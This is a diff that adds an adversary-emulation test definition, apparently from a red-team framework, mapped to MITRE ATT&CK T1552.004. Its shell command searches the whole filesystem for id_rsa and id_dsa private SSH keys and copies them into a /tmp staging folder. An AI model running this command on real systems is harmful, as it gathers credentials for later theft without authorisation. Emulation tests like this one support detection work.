@@ -1,0 +1,18 @@
+- description: 'Copy private SSH keys on a Linux system to a staging folder using
+    the `cp` command.
+
+    '
+  id: ad82a66e873a0ca8aa427d19e3157fdb
+  name: Copy Private SSH Keys with CP
+  platforms:
+    linux:
+      sh:
+        cleanup: rm /tmp/art-staging
+        command: mkdir /tmp/art-staging; find / -name id_rsa -exec cp --parents {}
+          /tmp/art-staging \;; find / -name id_dsa -exec cp --parents {} /tmp/art-staging
+          \;
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
